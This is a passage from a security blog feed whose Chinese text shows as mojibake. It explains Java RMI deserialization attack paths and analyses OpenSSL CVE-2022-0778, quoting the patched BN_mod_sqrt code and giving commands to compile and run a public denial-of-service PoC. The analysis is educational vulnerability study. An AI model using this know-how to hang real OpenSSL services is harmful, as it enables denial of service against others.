alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒã€ä¸€ä¸ªå®¢æˆ·ç«¯ã€ä¸€ä¸ªæœåŠ¡å™¨ã€‚æ³¨å†Œä¸­å¿ƒæ³¨å†Œäº†æœåŠ¡å™¨ä¸Šçš„æ–¹æ³•ï¼Œå®¢æˆ·ç«¯é€šè¿‡è®¿é—®æ³¨å†Œä¸­å¿ƒè·å¾—å¯¹åº”æ–¹æ³•çš„ä»£ç†å¯¹è±¡ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºstubï¼Œç„¶åé€šè¿‡è¿™ä¸ªä»£ç†å¯¹è±¡å»è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„ä»£ç†ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºskeleton,ï¼Œç›®æ ‡æœåŠ¡å™¨é€šè¿‡å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„æ–¹æ³•åä»¥åŠå‚æ•°æ‰§è¡Œå¯¹åº”çš„æ–¹æ³•ï¼Œè®©åå°†ç»“æœè¿”å›ä¸ªå®¢æˆ·ç«¯ä»£ç†å¯¹è±¡ï¼Œå®¢æˆ·ç«¯ä»£ç†å¯¹è±¡å†å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br>è¿™é‡Œéœ€è¦æ˜ç¡®çš„ä¸€ç‚¹å°±æ˜¯ï¼Œå®¢æˆ·ç«¯çš„ä»£ç†å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯å­˜æ ¹å¹¶ä¸æ˜¯å®¢æˆ·ç«¯è‡ªå·±ç”Ÿæˆçš„ï¼Œè€Œæ˜¯ç”±æ³¨å†Œä¸­å¿ƒç”Ÿæˆå¹¶è¿”å›çš„ï¼Œå› ä¸ºæœåŠ¡å™¨ç”Ÿæˆçš„ä»£ç†ï¼Œå³éª¨æ¶æ˜¯éšæœºå¯¼å‡ºåˆ°æŸä¸€ä¸ªç«¯å£çš„ï¼Œè¿™ä¸ªç«¯å£åªæœ‰æ³¨å†Œäº†è¯¥æ–¹æ³•çš„æ³¨å†Œä¸­å…´çŸ¥é“ï¼Œè€Œå®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“ï¼Œè€Œå®¢æˆ·ç«¯è¦è·å–è¿™ä¸ªipä»¥åŠç«¯å£çš„è¯åªèƒ½å‘æ³¨å†Œä¸­å¿ƒæŸ¥è¯¢ã€‚</p>
<p>ä»£ç å±‚é¢çš„ç†è§£ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/23f14a6c729231de63bb294151a6234b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šå›¾æ˜¯å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œå¯¹è±¡çš„ç®€å•çš„æ“ä½œæ­¥éª¤ï¼Œ11è¡Œé¦–å…ˆè·å–äº†ä¸€ä¸ªè¶…å¸‚å¯¹è±¡å®ä¾‹ï¼Œ12è¡Œåˆ›å»ºäº†ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒï¼Œ13è¡Œå°†å¯¹è±¡å®ä¾‹ç»‘å®šåˆ°äº†æ³¨å†Œä¸­å¿ƒé‡Œï¼Œå½“rebindè¢«æ‰§è¡Œçš„æ—¶å€™ä¼šå¯¹ç¬¬äºŒä¸ªå‚æ•°è°ƒç”¨getClassæ–¹æ³•è·å¾—ä¸€ä¸ªç±»åï¼Œç„¶ååŠ ä¸Šåç¼€_stubï¼ŒåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè®©åè·å–ä¸€ä¸ªremoteRefå¯¹è±¡ï¼Œè¯¥å¯¹è±¡å°±å­˜æ”¾ç€æœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œç„¶åå°†è¯¥å¯¹è±¡ä¼ é€’åˆ°æ³¨å†Œä¸­å…´è¿›è¡Œç»‘å®šå°±è·å¾—è·å¾—äº†ä¸€ä¸ªstubå¯¹è±¡ã€‚å®¢æˆ·ç«¯é€šè¿‡è®¿é—®æ³¨å†Œä¸­å¿ƒçš„1099ç«¯å£ï¼Œæ¥è·å¾—æŸä¸€ä¸ªå¯¹è±¡çš„stubä»£ç†ã€‚æ³¨å†Œä¸­å¿ƒå®é™…ä¸Šç»´æŠ¤äº†ä¸€ä¸ªhashè¡¨ï¼Œè¡¨ç¤ºäº†åç§°åˆ°å¯¹è±¡çš„æ˜ å°„å…³ç³»ï¼Œå½“å®¢æˆ·ç«¯æºå¸¦å¯¹åº”çš„marketæ¥æŸ¥æ‰¾æ—¶ï¼Œæ³¨å†Œä¸­å¿ƒå°±ä¼šè¿”å›å¯¹åº”çš„stubä»£ç†ã€‚<br>ä¸ºäº†éªŒè¯æˆ‘ä»¬çš„ç†è®ºï¼Œæˆ‘èŠ±äº†ä¸€ç‚¹æ—¶é—´ä½äº†ä¸€ä¸‹RMIåè®®é€šè¡Œè¿‡ç¨‹ä¸­çš„æ•°æ®åŒ…ã€‚</p>
<p>ã€å…„å¼Ÿä»¬ï¼Œè¿™å¼ å›¾æˆ‘ç”»é”™äº†ï¼Œè¿™æ‰€æœ‰çš„è¯·æ±‚éƒ½æ˜¯åœ¨æ‰§è¡Œlookupæ–¹æ³•æ—¶æ‰ä¼šå‘é€çš„ï¼Œæ¬²çŸ¥è¯¦æƒ…è¯·å‚è€ƒæˆ‘çš„ä¸‹ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_32731075/article/details/122280860?spm=1001.2014.3001.5501">ä»ä»£ç å±‚é¢çœ‹RMIè§„èŒƒçš„å®ç°ä¸æ”»å‡»åŸç†ï¼ˆä¸€ï¼‰</a>ã€‘<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c8351e449a79ae9ec586828d3097b1f4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªå·±æŠ“ä¸€ä¸‹çœ‹çœ‹ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦æ³¨æ„åˆ°çš„æ˜¯ï¼Œå®¢æˆ·ç«¯ä¸æ³¨å†Œä¸­å¿ƒï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„å¯¹è±¡ä¼ é€’æ˜¯é€šè¿‡javaçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¥å®ç°çš„ï¼Œé‚£ä¹ˆå°±è¡ç”Ÿå‡ºäº†javaçš„ååºåˆ—åŒ–æ”»å‡»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯è°ƒç”¨æ–¹æ³•çš„æ‰§è¡Œæ˜¯åœ¨æœåŠ¡å™¨ä¸Šé¢ï¼Œä½†å› ä¸ºæœåŠ¡å™¨å¾€å¾€ä¸æ³¨å†Œä¸­å…´æ˜¯åœ¨åŒä¸€ä¸ªJVMä¸Šï¼Œæ‰€ä»¥ååºåˆ—åŒ–æ”»å‡»çš„å¯¹è±¡å¾€å¾€æ˜¯æ³¨å†Œä¸­å¿ƒæ‰€åœ¨çš„è®¾å¤‡ï¼Œè€Œä¸æ˜¯å®¢æˆ·ç«¯ã€‚</p>
<p>è€Œ åœ¨æ”»å‡»çš„æ—¶å€™é€šå¸¸æœ‰ä¸‰ç§æ–¹å¼</p>
<p>ç¬¬ä¸€ç§æ–¹å¼ï¼š</p>
<p>å®¢æˆ·ç«¯åœ¨å‘æ³¨å†Œä¸­å¿ƒè¿›è¡Œlookupå‰é¦–å…ˆéœ€è¦è·å–ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒï¼Œæ—¢ç„¶æœ‰äº†æ³¨å†Œä¸­å¿ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œbindä¸rebindæ“ä½œ<br>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰‹åŠ¨æ³¨å†Œä¸€ä¸ªæ¶æ„å¯¹è±¡åˆ°æ³¨å†Œä¸­å¿ƒï¼Œå½“è¯¥æ¶æ„å¯¹è±¡å†è¢«æ³¨å†Œçš„æ—¶å€™å‰é¢æåˆ°ä¼šè°ƒç”¨getClassæ–¹æ³•è·å–ç±»åï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­å¦‚æœæˆ‘æ²¡æœ‰è®°é”™æ˜¯ä¼šè°ƒç”¨é™æ€ä»£ç å—ä¸­çš„å†…å®¹ï¼Œè¿™æ ·æˆ‘ä»¬çš„æ¶æ„ä»£ç å°±è¢«æ‰§è¡Œäº†ã€‚getClassæ–¹æ³•å…¶å®å°±æ˜¯è·å–äº†ä¸€ä¸ªç±»çš„Classå¯¹è±¡å®ä¾‹ï¼Œç„¶åå…¶å¯¹åº”çš„æ‰€æœ‰ç±»å®ä¾‹éƒ½æ˜¯é€šè¿‡è¿™ä¸ªClasså¯¹è±¡å®ä¾‹ç”Ÿæˆçš„ï¼Œè€Œåœ¨è·å–Classå¯¹è±¡å®ä¾‹çš„è¿‡ç¨‹ä¸­å°±ä¼šè°ƒç”¨é™æ€ä»£ç å—ä¸­çš„å†…å®¹ã€‚å¬èµ·æ¥å¥½åƒé€»è¾‘è‡ªæ´½äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“å¯¹ä¸å¯¹ï¼Œä»…ä¾›å‚è€ƒã€‚</p>
<p>ç¬¬äºŒç§æ–¹å¼ï¼š</p>
<p>ç¬¬äºŒç§æ–¹å¼å°±æ˜¯ç›´æ¥è°ƒç”¨æœåŠ¡å™¨ç«¯æœ‰é—®é¢˜çš„æ–¹æ³•æ¥å®ç°æˆ‘ä»¬æ”»å‡»çš„ç›®çš„ã€‚</p>
<p>ç¬¬ä¸‰ç§æ–¹å¼ï¼š</p>
<p>é€šè¿‡RMIçš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶æ¥åŠ è½½æ¶æ„ç±»ï¼Œæ„Ÿè§‰è¿™ç§æ–¹å¼æ˜¯è¢«åˆ©ç”¨çš„æœ€å¤šçš„ï¼Œæœ€è¿‘çš„log4j2æ¼æ´ä¹Ÿæ˜¯é€šè¿‡è¿™ç§æ–¹å¼æ¥åˆ©ç”¨çš„ã€‚<br>æ­£æ˜¯å› ä¸ºè¿™ä¸ªæœºåˆ¶ï¼Œæ‰€ä»¥ä½ åº”è¯¥çŸ¥é“äº†ä½ åœ¨ç½‘ç»œä¸Šæ‰¾çš„JNDIæ­å»ºå·¥å…·å¦‚marshalsecè¿™ç§ä¸ºç”šä¹ˆéœ€è¦ä½ å¯åŠ¨ä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œç„¶åæŠŠæ¶æ„ç±»çš„å­—èŠ‚ç æ–‡ä»¶æ‰”åˆ°é‡Œé¢å°±å¯ä»¥äº†ã€‚<br>è¿™ä¸ªä¸‡ä¸€çš„åŸç†æˆ‘è¿˜æ²¡è¯»ï¼Œæ˜å¤©å†è¯»è¯»ã€‚</p>
<p>ä»Šæ™šæœ‰ç‚¹çƒ¦èºï¼Œæˆ–è€…è¯´æœ€è¿‘éƒ½æœ‰ç‚¹çƒ¦èºï¼Œæ‰€ä»¥å†™è¿™ç¯‡æ–‡ç« æ—¶æ„Ÿè§‰å°±æƒ³æ˜¯è§‰å¾—å¿…é¡»è¦å†™äº†ä¸€æ ·ï¼Œè‡ªå·±éƒ½æ„Ÿè§‰å†™çš„å¾ˆå·®åŠ²ï¼Œæ²¡æœ‰è¿›è¡Œåˆç†çš„ç¼–æ’å¸ƒå±€ï¼Œæ„Ÿè§‰å°±æ˜¯èƒ¡ä¹±å¾—åœ¨å †ç ŒçŸ¥è¯†ç‚¹ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>OPENSSLæ‹’ç»æœåŠ¡æ¼æ´ã€CVE-2022-0778ã€‘</title>
    <url>/archives/9df09993.html</url>
    <content><![CDATA[<p>@<a href="OPENSSL%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E3%80%90CVE-2022-0778%E3%80%91">TOC</a><br>åºŸè¯ä¸å¤šè¯´ç›´æ¥å»çœ‹å®˜æ–¹githubçš„commitè®°å½•</p>
<blockquote>
<p><a href="https://github.com/openssl/openssl/commit/9eafb53614bf65797db25f467946e735e1b43dc9#">https://github.com/openssl/openssl/commit/9eafb53614bf65797db25f467946e735e1b43dc9#</a></p>
</blockquote>
<p>å¤§å“¥çš„åˆ†æ</p>
<blockquote>
<p><a href="https://github.com/drago-96/CVE-2022-0778">https://github.com/drago-96/CVE-2022-0778</a></p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9f6d04198c4c9adbc441822eae0020f4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ•´ä¸ªæ–‡ä»¶å¯¹åº”äº†å‡½æ•°BN_mod_sqrtï¼Œè¯¥å‡½æ•°æ¥å—4ä¸ªå‚æ•°ï¼ŒæŒ‰ç…§é¡ºåºæˆ‘ä»¬ç§°ä¸ºret,a,p,ctxï¼Œå‡½æ•°æœ€ç»ˆçš„å®ç°æ•ˆæœæ˜¯åˆ©ç”¨Tonelli&#x2F;Shanksç®—æ³•è®¡ç®—retï¼ŒTonelli&#x2F;Shanksç®—æ³•æ˜¯ç”¨æ¥ç»“ç®—äºŒæ¬¡å‰©ä½™çš„ä¸€ç§ç®—æ³•ï¼Œå…³äºäºŒæ¬¡å‰©ä½™è§£é‡Šä¸ºå­˜åœ¨ä¸€ä¸ªæ•°Xçš„å¹³æ–¹ä¸n mod påŒä½™ï¼Œåˆ™ç§°nä¸ºæ¨¡pçš„äºŒæ¬¡å‰©ä½™ã€‚<br>è¿™ä¸ªæ´å¤ªè€ƒéªŒæ•°å­¦äº†ï¼Œå¯¹æˆ‘è¿™ç§åŠè·¯å‡ºå®¶çš„æ¸£æ¸£æ¥è¯´åé¢çš„æ•°å­¦æ¨å¯¼è¿‡ç¨‹çœŸçš„æ˜¯ä¸è¦å¤ªéš¾å—ã€‚<br>å…³é”®çš„ä¿®æ”¹å‘ç”Ÿåœ¨è¿™ä¸€éƒ¨åˆ†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ad2eaaabb25b582db330640d8d146f5b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸€éƒ¨åˆ†ä»£ç è¢«åŒ…è£¹åœ¨ä¸€ä¸ªå¤§çš„å¾ªç¯é‡Œé¢ï¼Œè¿™é‡Œè´´å‡ºæ¥å®Œæ•´çš„ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/*-</span></span><br><span class="line"><span class="comment">         * Now  b  is  a^q * y^k  for some even  k  (0 &lt;= k &lt; 2^E</span></span><br><span class="line"><span class="comment">         * where  E  refers to the original value of  e,  which we</span></span><br><span class="line"><span class="comment">         * don&#x27;t keep in a variable),  and  x  is  a^((q+1)/2) * y^(k/2).</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * We have  a*b = x^2,</span></span><br><span class="line"><span class="comment">         *    y^2^(e-1) = -1,</span></span><br><span class="line"><span class="comment">         *    b^2^(e-1) = 1.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (BN_is_one(b)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!BN_copy(ret, x))</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">            err = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">goto</span> vrfy;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* find smallest  i  such that  b^(2^i) = 1 */</span></span><br><span class="line">        <span class="comment">/***********ä¿®æ”¹å‰çš„ä»£ç ***********/</span></span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_sqr(t, b, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        <span class="keyword">while</span> (!BN_is_one(t)) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">if</span> (i == e) &#123;</span><br><span class="line">                ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">         <span class="comment">/***********ä¿®æ”¹å‰çš„ä»£ç ***********/</span></span><br><span class="line">        <span class="comment">/* Find the smallest i, 0 &lt; i &lt; e, such that b^(2^i) = 1. */</span></span><br><span class="line">        <span class="comment">/***********ä¿®æ”¹åçš„ä»£ç ***********/</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; e; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!BN_mod_sqr(t, b, p, ctx))</span><br><span class="line">                    <span class="keyword">goto</span> end;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!BN_mod_mul(t, t, t, p, ctx))</span><br><span class="line">                    <span class="keyword">goto</span> end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!BN_mod_mul(t, t, t, p, ctx))</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">            <span class="keyword">if</span> (BN_is_one(t))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/***********ä¿®æ”¹åçš„ä»£ç ***********/</span></span><br><span class="line">        <span class="comment">/* If not found, a is not a square or p is not prime. */</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt;= e) &#123;</span><br><span class="line">            ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* t := y^2^(e - i - 1) */</span></span><br><span class="line">        <span class="keyword">if</span> (!BN_copy(t, y))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        <span class="keyword">for</span> (j = e - i - <span class="number">1</span>; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!BN_mod_sqr(t, t, p, ctx))</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_mul(y, t, t, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_mul(x, x, t, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_mul(b, b, y, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        e = i;</span><br><span class="line">    &#125;</span><br><span class="line"> vrfy:</span><br><span class="line">    <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * verify the result -- the input might have been not a square (test</span></span><br><span class="line"><span class="comment">         * added in 0.9.8)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_sqr(x, ret, p, ctx))</span><br><span class="line">            err = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!err &amp;&amp; <span class="number">0</span> != BN_cmp(x, A)) &#123;</span><br><span class="line">            ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);</span><br><span class="line">            err = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> end:</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ret != in)</span><br><span class="line">            BN_clear_free(ret);</span><br><span class="line">        ret = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (used_ctx)</span><br><span class="line">        BN_CTX_end(ctx);</span><br><span class="line">    bn_check_top(ret);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬ç›´æ¥æ¥çœ‹ä¿®æ”¹å‰çš„ä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">.....</span><br><span class="line">	i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (!BN_mod_sqr(t, b, p, ctx))</span><br><span class="line">	    <span class="keyword">goto</span> end;</span><br><span class="line">	<span class="keyword">while</span> (!BN_is_one(t)) &#123;</span><br><span class="line">	    i++;</span><br><span class="line">	    <span class="keyword">if</span> (i == e) &#123;</span><br><span class="line">	        ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);</span><br><span class="line">	        <span class="keyword">goto</span> end;</span><br><span class="line">  ....</span><br><span class="line">    <span class="keyword">if</span> (!BN_mod_mul(b, b, y, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">     e = i;</span><br><span class="line">  ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨å¤–å±‚å¾ªç¯ä¸­é¦–å…ˆä¼šç»™ièµ‹å€¼ä¸º1ï¼Œç„¶åè°ƒç”¨BN_mod_sqrå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„å«ä¹‰ä¸ºæ¥æ”¶ä¸€ä¸ªç´ æ•°pä¸æ•°bè®¡ç®—t&#x3D;b^2 % p å¦‚æœè®¡ç®—æˆåŠŸåˆ™è¿”å›1ï¼Œè®¡ç®—å¤±è´¥åˆ™è¿”å›0ã€‚å¦‚æœæ²¡æœ‰è®¡ç®—æˆåŠŸå°±goto endç›´æ¥é€€å‡ºå¾ªç¯ï¼Œä¹Ÿå°±ä¸ä¼šæœ‰æ‹’ç»æœåŠ¡çš„æƒ…å†µå‘ç”Ÿï¼Œå½“ç„¶æˆ‘ä»¬éœ€è¦è®©ä»–æ­£å¸¸è¿”å›è®¡ç®—ç»“æœã€‚è¿™æ˜¯ç¬¬ä¸€æ¬¡å¤–å±‚å¾ªç¯éœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼Œç„¶åè°ƒç”¨BN_is_oneå‡½æ•°åˆ¤æ–­tæ˜¯å¦ä¸º1ï¼Œå¦‚æœæ­¤æ—¶tç­‰äº1é‚£ä¹ˆå°±ä¸ä¼šè¿›å…¥å†…å±‚å¾ªç¯ï¼Œè€Œæ˜¯ç›´æ¥åˆ°å¤–å±‚å¾ªç¯çš„åº•éƒ¨å°†eçš„å€¼èµ‹ä¸ºiï¼Œæ­¤æ—¶çš„iä¸º1ï¼Œä¹Ÿå°±æ˜¯eä¸º1ï¼Œç¬¬ä¸€æ¬¡å¤–å±‚å¾ªç¯æœ€é‡è¦çš„å·¥ä½œä¹Ÿå°±æ˜¯è¿™ä¸€æ­¥ä¸ºeèµ‹å€¼ä¸º1ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦æƒ³æƒ³æ€ä¹ˆè¿›å…¥å†…å±‚å¾ªç¯å¹¶è®©i&#x3D;&#x3D;eæ’ä¸æˆç«‹å°±èƒ½ä½¿å¾—ç¨‹åºä¸€ç›´åœ¨å†…å±‚å¾ªç¯æ™ƒæ‚ è€Œä¸èƒ½é€€å‡ºï¼Œå¾ˆæ˜æ˜¾éœ€è¦æ»¡è¶³BN_is_oneå‡½æ•°çš„è®¡ç®—ç»“æœä¸ºFalseä¹Ÿå°±æ˜¯tä¸ç­‰äº1ã€‚è¿›å…¥ç¬¬äºŒæ¬¡å¤–å±‚å¾ªç¯æ—¶å½“BN_mod_sqrè®¡ç®—ç»“æœä½¿å¾—tä¸ä¸º1æ—¶ä¼šè¿›å…¥å†…å±‚å¾ªç¯ï¼Œç„¶åè®¡ç®—i++ï¼Œæ­¤æ—¶i&#x3D;2 !&#x3D; e ä¹Ÿå°±ä¸ä¼šè¿›å…¥å†…éƒ¨çš„ifè¯­å¥ï¼Œç„¶åè¿›å…¥ä¸‹ä¸€æ¬¡å†…å±‚å¾ªç¯ï¼Œæ­¤æ—¶iå†æ¬¡è‡ªå¢ï¼Œä»¥åæ— è®ºå¾ªç¯å¤šå°‘æ¬¡éƒ½ä¸ä¼šå†æœ‰i&#x3D;1&#x3D;eçš„æƒ…å†µå‘ç”Ÿäºæ˜¯ç¨‹åºå°±åœ¨å†…å±‚å¡æ­»äº†ã€‚é‚£ä¹ˆç°åœ¨éœ€è¦å®ç°çš„é€»è¾‘å°±æ˜¯åœ¨ç¬¬ä¸€æ¬¡å¤–å±‚å¾ªç¯æ—¶ä½¿å¾—tç­‰äº1ï¼Œç¬¬äºŒæ—¶ä¸ç­‰äº1ï¼Œè¿™ä¹ˆçœ‹æ¥æ˜¯ä¸å¯èƒ½å®ç°çš„é™¤ébä¸pçš„å€¼åœ¨åé¢çš„ä»£ç ä¸­å‘ç”Ÿäº†å˜åŒ–ï¼Œä¸ç„¶ä¸å¯èƒ½å­˜åœ¨å¯¹ç›¸åŒçš„æ“ä½œæ•°æ“ä½œä¸¤æ¬¡ç»“æœä¸ä¸€æ ·ã€‚æ°å¥½ä¸Šé¢ä»£ç ä¸­ä½¿ç”¨äº†BN_mod_mulå‡½æ•°æ”¹å˜äº†bçš„å€¼ï¼Œæ¯ä¸€æ¬¡å¤–å±‚å¾ªç¯ä½¿ç”¨è¯¥å‡½æ•°æ—¶æ”¹å˜bçš„å€¼ï¼Œä¸ºb&#x3D;b<em>y mod p ï¼Œè€Œyçš„å€¼ä¸º t</em>t mod pã€‚<br>äº‹æƒ…åˆ°äº†è¿™é‡Œä¸€åˆ‡éƒ½å·²ç»æ˜æœ—äº†èµ·æ¥ï¼Œå½“ç„¶æ€ä¹ˆæ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„på’Œbçš„å€¼æ˜¯ä¸ªé—®é¢˜ï¼Œè¿™é‡Œé¢çš„æ¨å¯¼æˆ‘çœ‹äº†å­˜åœ¨å¤§é‡çš„æ•°å­¦ç®—æ³•ï¼Œç›´æ¥ç»™æˆ‘æ•´è’™äº†ï¼ŒæŸ¥äº†ä¸€äº›èµ„æ–™ä¹Ÿæ²¡æœ‰æçš„å¾ˆæ˜ç™½ã€‚<br>ç„¶åæˆ‘å»è¯•äº†ä¸€ä¸‹è¿™ä¸ªpocï¼Œå‘ç°ç¡®å®æœ‰æ•ˆï¼Œé¦–å…ˆä½ çš„åœ¨ä½ çš„è®¾å¤‡ä¸Šå®‰è£…opensslï¼Œç„¶åæŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬æ˜¯ä¸æ˜¯å­˜åœ¨æ¼æ´<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f40147184694f737d314256d31a597f5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸å¥½æ„æ€ï¼Œå¥½åƒæœ‰æ¼æ´<br>ç„¶åä½ ä¸‹è½½å¥½pocï¼Œç„¶åä½¿ç”¨gccç¼–è¯‘<br><code>gcc -o my_bad_sqrt my_bad_sqrt.c -lcrypt</code><br>ç¼–è¯‘çš„è¿‡ç¨‹ä¸­å¯èƒ½æŠ¥é”™<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a7b556f84a26a0655a93482ea258ab2b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">centosæ‰§è¡Œ<br><code>yum install openssl-devel</code>å®‰è£…ä¾èµ–<br>ubuntuæ‰§è¡Œ<br><code>apt-get install libssl-dev</code>å®‰è£…ä¾èµ–<br>ç„¶åè¿è¡Œç¼–è¯‘å¥½çš„å¯æ‰§è¡Œæ–‡ä»¶<br><code>./my_bad_sqrt</code><br>ç„¶åä¾æ—§ä¼šçœ‹åˆ°ç»ˆç«¯ä¸€ç›´å¡èµ·äº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4210eab367d720ea7462d79068a07909.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å»çœ‹ä¸€ä¸‹CPUçš„å ç”¨æƒ…å†µ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/df6bcb9d766c7c420438c771652089ba.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ•ˆæœç›´æ¥æ‹‰æ»¡å¥½å—<br>çœ‹äº†ä¸€ä¸‹pocçš„å†™æ³•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9c934f6a8589937bdce039a9c4335a8f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾ˆç®€å•ï¼Œå…ˆç”³è¯·ç©ºé—´ï¼Œç„¶åå°†åè¿›åˆ¶å­—ç¬¦ä¸²aä¸pè½¬æ¢ä¸ºå¤§æ•°,ç„¶åè°ƒç”¨BN_mod_sqrtå‡½æ•°ï¼Œæƒ³æ¥è¿™ä¸ªå‡½æ•°å°±åœ¨openssl&#x2F;bn.hè¿™ä¸ªå¤´æ–‡ä»¶é‡Œå¤´ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
